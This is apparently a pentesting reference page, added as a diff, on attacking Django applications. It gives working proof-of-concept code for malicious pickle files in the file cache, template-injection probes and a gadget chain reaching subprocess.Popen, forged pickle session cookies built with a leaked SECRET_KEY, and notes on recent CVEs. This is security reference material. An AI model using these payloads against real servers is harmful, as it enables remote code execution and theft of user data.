@@ -1,0 +1,109 @@
+# Django
+
+## Cache Manipulation to RCE
+Django's default cache storage method is [Python pickles](https://docs.python.org/3/library/pickle.html), which can lead to RCE if [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **If an attacker can gain write access to the cache, they can escalate this vulnerability to RCE on the underlying server**.
+
+Django cache is stored in one of four places: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), or a [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache stored in a Redis server or database are the most likely attack vectors (Redis injection and SQL injection), but an attacker may also be able to use file-based cache to turn an arbitrary write into RCE. Maintainers have marked this as a non-issue. It's important to note that the cache file folder, SQL table name, and Redis server details will vary based on implementation.
+
+On **FileBasedCache**, the pickled value is written to a file under `CACHES['default']['LOCATION']` (often `/var/tmp/django_cache/`). If that directory is world-writable or attacker-controlled, dropping a malicious pickle under the expected cache key yields code execution when the app reads it:
+
+```bash
+python - <<'PY'
+import pickle, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ("id >/tmp/pwned",))
+open('/var/tmp/django_cache/cache:malicious', 'wb').write(pickle.dumps(RCE(), protocol=4))
+PY
+```
+
+This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436
+
+---
+
+## Server-Side Template Injection (SSTI)
+The Django Template Language (DTL) is **Turing-complete**. If user-supplied data is rendered as a *template string* (for example by calling `Template(user_input).render()` or when `|safe`/`format_html()` removes auto-escaping), an attacker may achieve full SSTI → RCE.
+
+### Detection
+1. Look for dynamic calls to `Template()` / `Engine.from_string()` / `render_to_string()` that include *any* unsanitised request data.
+2. Send a time-based or arithmetic payload:
+   ```django
+   {{7*7}}
+   ```
+   If the rendered output contains `49` the input is compiled by the template engine.
+3. DTL is **not Jinja2**: arithmetic/loop payloads regularly raise `TemplateSyntaxError`/500 while still proving evaluation. Polyglots like `${{<%[%'"}}%` are good crash-or-render probes.
+
+### Context exfiltration when RCE is blocked
+Even if object-walking to `subprocess.Popen` fails, DTL still exposes in-scope objects:
+```django
+{{ request }}               {# confirm SSTI #}
+{{ request.META }}           {# leak Gunicorn/UWSGI headers, cookies, proxy info #}
+{{ users }}                  {# QuerySet in the context? #}
+{{ users.0 }}                {# first row #}
+{{ users.values }}           {# dumps dicts of every column (email/flags/plaintext passwords if stored) #}
+```
+`QuerySet.values()` coerces rows to dictionaries, bypassing `__str__` and exposing all fields returned by the queryset. This works even when direct Python execution is filtered.
+
+**Automation pattern**: authenticate, grab the CSRF token, save a marker-prefixed payload in any persistent field (e.g., username/profile bio), then request a view that renders it (AJAX endpoints like `/likes/<id>` are common). Parse a stable attribute (e.g., `title="..."`) to recover the rendered result and iterate payloads.
+
+### Primitive to RCE
+Django blocks direct access to `__import__`, but the Python object graph is reachable:
+```django
+{{''.__class__.mro()[1].__subclasses__()}}
+```
+Find the index of `subprocess.Popen` (≈400–500 depending on Python build) and execute arbitrary commands:
+```django
+{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
+```
+A safer universal gadget is to iterate until `cls.__name__ == 'Popen'`.
+
+The same gadget works for **Debug Toolbar** or **Django-CMS** template rendering features that mishandle user input.
+
+---
+
+### Also see: ReportLab/xhtml2pdf PDF export RCE
+Applications built on Django commonly integrate xhtml2pdf/ReportLab to export views as PDF. When user-controlled HTML flows into PDF generation, rl_safe_eval may evaluate expressions inside triple brackets `[[[ ... ]]]` enabling code execution (CVE-2023-33733). Details, payloads, and mitigations:
+
+---
+
+## Pickle-Backed Session Cookie RCE
+If the setting `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` is enabled (or a custom serializer that deserialises pickle), Django *decrypts and unpickles* the session cookie **before** calling any view code. Therefore, possessing a valid signing key (the project `SECRET_KEY` by default) is enough for immediate remote code execution.
+
+### Exploit Requirements
+* The server uses `PickleSerializer`.
+* The attacker knows / can guess `settings.SECRET_KEY` (leaks via GitHub, `.env`, error pages, etc.).
+
+### Proof-of-Concept
+```python
+#!/usr/bin/env python3
+from django.contrib.sessions.serializers import PickleSerializer
+from django.core import signing
+import os, base64
+
+class RCE(object):
+    def __reduce__(self):
+        return (os.system, ("id > /tmp/pwned",))
+
+mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
+print(f"sessionid={mal}")
+```
+Send the resulting cookie, and the payload runs with the permissions of the WSGI worker.
+
+**Mitigations**: Keep the default `JSONSerializer`, rotate `SECRET_KEY`, and configure `SESSION_COOKIE_HTTPONLY`.
+
+---
+
+## Recent (2023-2025) High-Impact Django CVEs Pentesters Should Check
+* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (fixed June 4 2025). Allows attackers to smuggle newlines/ANSI codes into log files and poison downstream log analysis. Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2. 
+* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). Craft JSON keys to break out of quoting and execute arbitrary SQL. Fixed in 4.2.15 / 5.0.8. 
+
+Always fingerprint the exact framework version via the `X-Frame-Options` error page or `/static/admin/css/base.css` hash and test the above where applicable.
+
+---
+
+## References
+* Django security release – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025. 
+* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024. 
+* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
+* Django docs – QuerySet.values(): [https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values](https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values)
+* 0xdf: HackNet (HTB) — HTML Attribute Injection → Django SSTI → QuerySet.values data dump → Pickle FileBasedCache RCE – [https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html](https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html)
